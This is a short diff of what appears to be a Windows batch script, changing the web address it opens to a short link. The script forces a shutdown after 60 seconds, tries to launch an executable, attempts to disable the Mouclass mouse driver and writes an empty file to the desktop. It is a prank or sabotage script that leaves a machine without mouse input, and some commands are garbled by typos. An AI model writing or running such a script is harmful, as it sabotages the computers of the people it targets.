@@ -1,5 +1,5 @@
 shutdown -s -t 60
-explorer http://tanluying.github.io/ying
+explorer http://b23.tv/iiRlLPF
 stare "" "D:\kugou.exe"
 sc config Mouclassstart= disabled
 cd.>C:\Users\user\Desktop\ying.txt
